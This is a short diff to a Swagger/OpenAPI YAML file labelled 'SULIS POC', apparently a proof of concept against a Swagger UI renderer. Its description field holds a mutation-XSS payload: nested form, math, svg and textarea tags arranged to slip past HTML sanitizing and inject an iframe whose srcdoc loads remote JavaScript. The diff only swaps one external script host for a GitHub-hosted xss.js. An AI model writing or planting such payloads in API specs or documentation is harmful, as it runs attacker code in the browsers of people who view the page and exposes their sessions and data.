@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: SULIS POC
   description: |
-       <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://standing-salt.surge.sh/script.js></script>">
+       <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://raw.githubusercontent.com/ibus1/xss/refs/heads/main/xss.js></script>">
 paths:
   /accounts:
     get:
